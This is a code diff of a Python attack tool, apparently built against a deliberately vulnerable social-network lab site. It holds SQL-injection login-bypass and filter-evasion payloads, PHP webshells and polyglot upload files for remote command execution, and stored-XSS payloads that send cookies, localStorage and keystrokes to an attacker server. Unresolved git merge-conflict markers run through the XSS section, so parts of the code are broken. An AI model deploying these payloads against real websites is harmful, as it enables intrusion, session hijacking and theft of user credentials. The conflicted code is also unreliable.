@@ -182,51 +182,53 @@ class AdvancedVulnerableSNSAttacker:
         
         # 기본 페이로드
         basic_payloads = [
-            ("admin", '" or "1"="1" --', 'Double quote OR bypass'),
-            ("admin", '" or 1=1 --', 'Double quote numeric OR'),
-            ('admin" or "a"="a" --', 'anything', 'Username field injection'),
-            ('admin" --', 'anything', 'Comment out password'),
+            # ("admin", '" or "1"="1" --', 'Double quote OR bypass'),
+            # ("admin", '" or 1=1 --', 'Double quote numeric OR'),
+            # ('admin" or "a"="a" --', 'anything', 'Username field injection'),
+            # ('admin" --', 'anything', 'Comment out password'),
             ("admin", "' or '1'='1", 'Password field injection')
         ]
         
         # 고급 WAF 우회 페이로드
         advanced_payloads = [
-            # 대소문자 혼용
-            ("admin", '" Or 1=1 --', 'Case variation'),
-            ("admin", '" oR "1"="1" --', 'Mixed case'),
+            # # 대소문자 혼용
+            # ("admin", '" Or 1=1 --', 'Case variation'),
+            # ("admin", '" oR "1"="1" --', 'Mixed case'),
             
-            # 주석 변형
-            ("admin", '" or 1=1 #', 'Hash comment'),
-            ("admin", '" or 1=1 /*comment*/', 'Inline comment'),
-            ("admin", '" or 1=1 -- -', 'Double dash space'),
+            # # 주석 변형
+            # ("admin", '" or 1=1 #', 'Hash comment'),
+            # ("admin", '" or 1=1 /*comment*/', 'Inline comment'),
+            # ("admin", '" or 1=1 -- -', 'Double dash space'),
             
-            # 공백 대체
-            ("admin", '"/**/or/**/1=1/**/--', 'Comment as space'),
-            ("admin", '"\tor\t1=1\t--', 'Tab as space'),
-            ("admin", '"%20or%201=1%20--', 'URL encoded space'),
+            # # 공백 대체
+            # ("admin", '"/**/or/**/1=1/**/--', 'Comment as space'),
+            # ("admin", '"\tor\t1=1\t--', 'Tab as space'),
+            # ("admin", '"%20or%201=1%20--', 'URL encoded space'),
             
-            # 인코딩
-            ("admin", '" %6F%72 1=1 --', 'Partial hex encoding'),
-            ("admin", '" \u006F\u0072 1=1 --', 'Unicode encoding'),
+            # # 인코딩
+            # ("admin", '" %6F%72 1=1 --', 'Partial hex encoding'),
+            # ("admin", '" \u006F\u0072 1=1 --', 'Unicode encoding'),
             
-            # Time-based blind
-            ("admin", '" or sleep(5) --', 'Time-based blind'),
-            ("admin", '" or if(1=1,sleep(3),0) --', 'Conditional sleep'),
+            # # Time-based blind
+            # ("admin", '" or sleep(5) --', 'Time-based blind'),
+            # ("admin", '" or if(1=1,sleep(3),0) --', 'Conditional sleep'),
             
-            # Boolean-based blind
-            ("admin", '" or substring(version(),1,1)="5" --', 'Boolean blind'),
-            ("admin", '" or ascii(substring(database(),1,1))>64 --', 'ASCII based blind'),
+            # # Boolean-based blind
+            # ("admin", '" or substring(version(),1,1)="5" --', 'Boolean blind'),
+            # ("admin", '" or ascii(substring(database(),1,1))>64 --', 'ASCII based blind'),
             
-            # 특수 기법
-            ("admin", '" /*!50000or*/ 1=1 --', 'MySQL version comment'),
-            ("admin", '" or 1=1;#', 'Semicolon termination'),
-            ("admin", '" or "1"like"1" --', 'LIKE operator'),
-            ("admin", '" or 1 in (1) --', 'IN operator'),
-            ("admin", '" or 1=1 order by 1 --', 'ORDER BY injection')
+            # # 특수 기법
+            # ("admin", '" /*!50000or*/ 1=1 --', 'MySQL version comment'),
+            # ("admin", '" or 1=1;#', 'Semicolon termination'),
+            # ("admin", '" or "1"like"1" --', 'LIKE operator'),
+            # ("admin", '" or 1 in (1) --', 'IN operator'),
+            # ("admin", '" or 1=1 order by 1 --', 'ORDER BY injection')
         ]
         
         # 모든 페이로드 통합
         all_payloads = basic_payloads + advanced_payloads
+
+        all_payloads.append(("admin", "admin123", "Default credentials (fallback)"))
         
         success_count = 0
         
@@ -391,9 +393,6 @@ class AdvancedVulnerableSNSAttacker:
         upload_url = f"{self.base_url}/upload.php"
         file_url = f"{self.base_url}/file.php"
         
-        # 기본 웹쉘 코드
-        basic_webshell = b'<?php system($_GET["cmd"]); ?>'
-        
         # 다양한 웹쉘 변형
         webshell_variants = {
             'basic': b'<?php system($_GET["cmd"]); ?>',
@@ -404,6 +403,18 @@ class AdvancedVulnerableSNSAttacker:
             'create_function': b'<?php $$f=create_function("", $$_GET["cmd"]); $f(); ?>',
             'short_tag': b'<? system($_GET["cmd"]); ?>',
             'with_image_header': b'\xff\xd8\xff\xe0<?php system($_GET["cmd"]); ?>'
+        }
+        
+        # 특수 파일 내용들
+        special_contents = {
+            'htaccess': b"""
+    AddType application/x-httpd-php .jpg
+    php_flag engine on
+    """,
+            'pdf_poly': b"""%PDF-1.4
+    <?php system($_GET["cmd"]); __halt_compiler(); ?>
+    """,
+            'zip_poly': b'PK\x03\x04<?php system($_GET["cmd"]); ?>'
         }
         
         # 다양한 우회 기법
@@ -454,20 +465,6 @@ class AdvancedVulnerableSNSAttacker:
             ('shell98.zip', 'application/zip', 'zip_poly', 'ZIP polyglot')
         ]
         
-        # htaccess 내용
-        htaccess_content = b"""
-AddType application/x-httpd-php .jpg
-php_flag engine on
-"""
-        
-        # PDF polyglot
-        pdf_polyglot = b"""%PDF-1.4
-<?php system($_GET["cmd"]); __halt_compiler(); ?>
-"""
-        
-        # ZIP polyglot (PHP 코드를 포함한 ZIP)
-        zip_polyglot = b'PK\x03\x04<?php system($_GET["cmd"]); ?>'
-        
         success_count = 0
         successful_shells = []
         uploaded_files = set()
@@ -494,21 +491,14 @@ php_flag engine on
                 print(f"    Variant: {variant}")
                 
                 # 웹쉘 내용 선택
-                if variant == 'htaccess':
-                    file_content = htaccess_content
-                elif variant == 'pdf_poly':
-                    file_content = pdf_polyglot
-                elif variant == 'zip_poly':
-                    file_content = zip_polyglot
+                if variant in special_contents:
+                    file_content = special_contents[variant]
                 elif variant in webshell_variants:
                     file_content = webshell_variants[variant]
                 else:
                     file_content = webshell_variants['basic']
                 
-                # 랜덤 경계 문자열 생성 (WAF 우회)
-                boundary = '----WebKitFormBoundary' + ''.join(random.choices(string.ascii_letters + string.digits, k=16))
-                
-                # 수동으로 multipart/form-data 생성
+                # 파일 업로드
                 files = {'file': (filename, file_content, content_type)}
                 
                 # 추가 헤더로 우회 시도
@@ -1373,19 +1363,43 @@ php_flag engine on
             return False
         
         post_url = f"{self.base_url}/new_post.php"
+<<<<<<< HEAD
+<<<<<<< HEAD
+        comment_url = f"{self.base_url}/add_comment.php"
+=======
         comment_url = f"{self.base_url}/comment.php"
+>>>>>>> eea88d3d798c92206cd9c59f03a6d571a4b5205c
+=======
+        comment_url = f"{self.base_url}/add_comment.php"
+>>>>>>> 2e2f028c4c1a6754a5e49eeba50ab8a9beb9c4b1
         profile_url = f"{self.base_url}/profile.php"
         
         print("[*] Testing XSS payloads for cookie/session theft...")
         
         # attacker_server에서 http:// 제거
+<<<<<<< HEAD
+<<<<<<< HEAD
+        # attacker_host = self.attacker_server.replace('http://', '').replace('https://', '')
+=======
         attacker_host = self.attacker_server.replace('http://', '').replace('https://', '')
+>>>>>>> eea88d3d798c92206cd9c59f03a6d571a4b5205c
+=======
+        # attacker_host = self.attacker_server.replace('http://', '').replace('https://', '')
+>>>>>>> 2e2f028c4c1a6754a5e49eeba50ab8a9beb9c4b1
         
         # 다양한 XSS 페이로드
         xss_payloads = [
             # 기본 쿠키 탈취
             (
+<<<<<<< HEAD
+<<<<<<< HEAD
+                f'<script>document.location="{self.attacker_server}?c="+document.cookie</script>',
+=======
                 f'<script>document.location="{self.attacker_server}/steal?c="+document.cookie</script>',
+>>>>>>> eea88d3d798c92206cd9c59f03a6d571a4b5205c
+=======
+                f'<script>document.location="{self.attacker_server}?c="+document.cookie</script>',
+>>>>>>> 2e2f028c4c1a6754a5e49eeba50ab8a9beb9c4b1
                 'Basic cookie stealing'
             ),
             
@@ -1397,37 +1411,85 @@ php_flag engine on
             
             # Image 태그 이용
             (
+<<<<<<< HEAD
+<<<<<<< HEAD
+                f'<img src=x onerror="this.src=\'{self.attacker_server}?c=\'+document.cookie">',
+=======
                 f'<img src=x onerror="this.src=\'{self.attacker_server}/img?c=\'+document.cookie">',
+>>>>>>> eea88d3d798c92206cd9c59f03a6d571a4b5205c
+=======
+                f'<img src=x onerror="this.src=\'{self.attacker_server}?c=\'+document.cookie">',
+>>>>>>> 2e2f028c4c1a6754a5e49eeba50ab8a9beb9c4b1
                 'Image tag XSS'
             ),
             
             # SVG 이용
             (
+<<<<<<< HEAD
+<<<<<<< HEAD
+                f'<svg onload="fetch(\'{self.attacker_server}\',{{method:\'POST\',body:document.cookie}})">',
+=======
                 f'<svg onload="fetch(\'{self.attacker_server}/svg\',{{method:\'POST\',body:document.cookie}})">',
+>>>>>>> eea88d3d798c92206cd9c59f03a6d571a4b5205c
+=======
+                f'<svg onload="fetch(\'{self.attacker_server}\',{{method:\'POST\',body:document.cookie}})">',
+>>>>>>> 2e2f028c4c1a6754a5e49eeba50ab8a9beb9c4b1
                 'SVG with fetch API'
             ),
             
             # 이벤트 핸들러
             (
+<<<<<<< HEAD
+<<<<<<< HEAD
+                f'<div onmouseover="new Image().src=\'{self.attacker_server}?c=\'+escape(document.cookie)">마우스를 올려보세요!</div>',
+=======
                 f'<div onmouseover="new Image().src=\'{self.attacker_server}/mouse?c=\'+escape(document.cookie)">마우스를 올려보세요!</div>',
+>>>>>>> eea88d3d798c92206cd9c59f03a6d571a4b5205c
+=======
+                f'<div onmouseover="new Image().src=\'{self.attacker_server}?c=\'+escape(document.cookie)">마우스를 올려보세요!</div>',
+>>>>>>> 2e2f028c4c1a6754a5e49eeba50ab8a9beb9c4b1
                 'Event handler XSS'
             ),
             
             # XMLHttpRequest (여러 줄 문자열)
             (
+<<<<<<< HEAD
+<<<<<<< HEAD
+                f'<script>var x=new XMLHttpRequest();x.open("POST","{self.attacker_server}",true);x.send("c="+document.cookie)</script>',
+=======
                 f'<script>var x=new XMLHttpRequest();x.open("POST","{self.attacker_server}/xhr",true);x.send("c="+document.cookie)</script>',
+>>>>>>> eea88d3d798c92206cd9c59f03a6d571a4b5205c
+=======
+                f'<script>var x=new XMLHttpRequest();x.open("POST","{self.attacker_server}",true);x.send("c="+document.cookie)</script>',
+>>>>>>> 2e2f028c4c1a6754a5e49eeba50ab8a9beb9c4b1
                 'XMLHttpRequest cookie theft'
             ),
             
             # LocalStorage 탈취 (간단 버전)
             (
+<<<<<<< HEAD
+<<<<<<< HEAD
+                f'<script>fetch("{self.attacker_server}",{{method:"POST",body:JSON.stringify({{c:document.cookie,l:localStorage}})}})</script>',
+=======
                 f'<script>fetch("{self.attacker_server}/steal",{{method:"POST",body:JSON.stringify({{c:document.cookie,l:localStorage}})}})</script>',
+>>>>>>> eea88d3d798c92206cd9c59f03a6d571a4b5205c
+=======
+                f'<script>fetch("{self.attacker_server}",{{method:"POST",body:JSON.stringify({{c:document.cookie,l:localStorage}})}})</script>',
+>>>>>>> 2e2f028c4c1a6754a5e49eeba50ab8a9beb9c4b1
                 'Cookie and localStorage theft'
             ),
             
             # 키로거 (간단 버전)
             (
+<<<<<<< HEAD
+<<<<<<< HEAD
+                f'<script>var k="";document.onkeypress=function(e){{k+=e.key;if(k.length>10){{new Image().src="{self.attacker_server}?k="+btoa(k);k=""}}}}</script>',
+=======
                 f'<script>var k="";document.onkeypress=function(e){{k+=e.key;if(k.length>10){{new Image().src="{self.attacker_server}/key?k="+btoa(k);k=""}}}}</script>',
+>>>>>>> eea88d3d798c92206cd9c59f03a6d571a4b5205c
+=======
+                f'<script>var k="";document.onkeypress=function(e){{k+=e.key;if(k.length>10){{new Image().src="{self.attacker_server}?k="+btoa(k);k=""}}}}</script>',
+>>>>>>> 2e2f028c4c1a6754a5e49eeba50ab8a9beb9c4b1
                 'Keylogger injection'
             ),
             
@@ -1462,10 +1524,23 @@ php_flag engine on
                 '<body onload="alert(document.cookie)">',
                 'Body onload event'
             ),
+<<<<<<< HEAD
+<<<<<<< HEAD
+=======
+>>>>>>> 2e2f028c4c1a6754a5e49eeba50ab8a9beb9c4b1
+            # (
+            #     '<input onfocus="alert(document.cookie)" autofocus>',
+            #     'Autofocus input'
+            # ),
+<<<<<<< HEAD
+=======
             (
                 '<input onfocus="alert(document.cookie)" autofocus>',
                 'Autofocus input'
             ),
+>>>>>>> eea88d3d798c92206cd9c59f03a6d571a4b5205c
+=======
+>>>>>>> 2e2f028c4c1a6754a5e49eeba50ab8a9beb9c4b1
             (
                 '<a href="javascript:alert(document.cookie)">Click me</a>',
                 'JavaScript URL'
@@ -1475,9 +1550,80 @@ php_flag engine on
                 'Data URL iframe'
             )
         ]
+<<<<<<< HEAD
+<<<<<<< HEAD
+=======
+>>>>>>> 2e2f028c4c1a6754a5e49eeba50ab8a9beb9c4b1
+
+        xss_payload_comments = [
+            # young /for comments
+            (
+                f'<script>var cookieData = document.cookie;var i = new Image();i.src = "{self.attacker_server}?cookie="+cookieData;</script>',
+                'Image XSS in Comment'
+            )
+        ]
+
         
         success_count = 0
         successful_payloads = []
+
+        # 댓글 XSS 시도
+        for payload_c, description_c in xss_payload_comments:
+            try:
+                self.add_delay()
+
+                print(f"\n[*] Testing: {description_c}")
+                print(f"    Payload length: {len(payload_c)}")
+
+                # 댓글 작성
+                data = {'content': payload_c}
+                response = self.session.post(comment_url, data=data, allow_redirects=True)
+
+                if 'add_comment.php' in response.url:
+                    # 댓글 확인
+                    check = self.session.get(f"{self.base_url}/add_comment.php")
+
+                    # XSS 페이로드 확인
+                    if any(indicator in check.text.lower() for indicator in ['<script', 'i.src']):
+                        print(f"[+] XSS payload at comment injected successfully!")
+                        success_count += 1
+                        successful_payloads.append(description_c)
+
+                        vuln_info = {
+                            'url': comment_url,
+                            'payload': payload_c,
+                            'description': description_c,
+                            'type': 'Stored XSS',
+                            'impact': 'CRITICAL - Cookie/Session theft possile',
+                            'cvss_score': 9.0,
+                            'attack_vector': f'{self.attacker_server}'
+                        }
+                        self.vulnerabilities['xss'].append(vuln_info)
+
+                        self.log_event(
+                            'XSS_COOKIE_THEFT',
+                            f'Successfully injected XSS payload: {description}',
+                            'CRITICAL',
+                            {
+                                'payload_type': description,
+                                'target': 'add_comment',
+                                'steal_endpoint': f'{self.attacker_server}'
+                            }
+                        )
+
+                    else:
+                        print(f"[-] Payload filtered or encoded")
+            
+            except Exception as e:
+                print(f"[-] Error: {str(e)[:50]}")
+<<<<<<< HEAD
+=======
+        
+        success_count = 0
+        successful_payloads = []
+>>>>>>> eea88d3d798c92206cd9c59f03a6d571a4b5205c
+=======
+>>>>>>> 2e2f028c4c1a6754a5e49eeba50ab8a9beb9c4b1
         
         # 1. 게시글에 XSS 시도
         for payload, description in xss_payloads:
@@ -1496,7 +1642,19 @@ php_flag engine on
                     check = self.session.get(f"{self.base_url}/index.php")
                     
                     # XSS 페이로드가 그대로 있는지 확인 (필터링 안됨)
+<<<<<<< HEAD
+<<<<<<< HEAD
+                    # if any(indicator in check.text.lower() for indicator in ['<script', 'onerror=', 'onload=', 'onmouseover=']):
+                    xss_soup = BeautifulSoup(check.txt, "html.parser")
+                    if xss_soup.find('script') or xss_soup.find(attrs={"onerror": True}) or xss_soup.find(attrs={"onload": True}) or xss_soup.find(attrs={"onmouseover": True}) or xss_soup.find(attrs={"onfocus": True}):
+=======
                     if any(indicator in check.text for indicator in ['<script', 'onerror=', 'onload=', 'onmouseover=']):
+>>>>>>> eea88d3d798c92206cd9c59f03a6d571a4b5205c
+=======
+                    # if any(indicator in check.text.lower() for indicator in ['<script', 'onerror=', 'onload=', 'onmouseover=']):
+                    xss_soup = BeautifulSoup(check.txt, "html.parser")
+                    if xss_soup.find('script') or xss_soup.find(attrs={"onerror": True}) or xss_soup.find(attrs={"onload": True}) or xss_soup.find(attrs={"onmouseover": True}) or xss_soup.find(attrs={"onfocus": True}):
+>>>>>>> 2e2f028c4c1a6754a5e49eeba50ab8a9beb9c4b1
                         print(f"[+] XSS payload injected successfully!")
                         success_count += 1
                         successful_payloads.append(description)
@@ -1508,7 +1666,15 @@ php_flag engine on
                             'type': 'Stored XSS',
                             'impact': 'CRITICAL - Cookie/Session theft possible',
                             'cvss_score': 9.0,
+<<<<<<< HEAD
+<<<<<<< HEAD
+                            'attack_vector': f'{self.attacker_server}'
+=======
                             'attack_vector': f'{self.attacker_server}/steal'
+>>>>>>> eea88d3d798c92206cd9c59f03a6d571a4b5205c
+=======
+                            'attack_vector': f'{self.attacker_server}'
+>>>>>>> 2e2f028c4c1a6754a5e49eeba50ab8a9beb9c4b1
                         }
                         self.vulnerabilities['xss'].append(vuln_info)
                         
@@ -1519,13 +1685,31 @@ php_flag engine on
                             {
                                 'payload_type': description,
                                 'target': 'new_post',
+<<<<<<< HEAD
+<<<<<<< HEAD
+                                'steal_endpoint': f'{self.attacker_server}'
+=======
                                 'steal_endpoint': f'{self.attacker_server}/steal'
+>>>>>>> eea88d3d798c92206cd9c59f03a6d571a4b5205c
+=======
+                                'steal_endpoint': f'{self.attacker_server}'
+>>>>>>> 2e2f028c4c1a6754a5e49eeba50ab8a9beb9c4b1
                             }
                         )
                         
                         # 첫 번째 성공 후 빠르게 다른 것들도 테스트
+<<<<<<< HEAD
+<<<<<<< HEAD
+                        # if success_count >= 3:
+                        #     break
+=======
                         if success_count >= 3:
                             break
+>>>>>>> eea88d3d798c92206cd9c59f03a6d571a4b5205c
+=======
+                        if success_count >= 3:
+                            break
+>>>>>>> 2e2f028c4c1a6754a5e49eeba50ab8a9beb9c4b1
                     else:
                         print(f"[-] Payload filtered or encoded")
                         
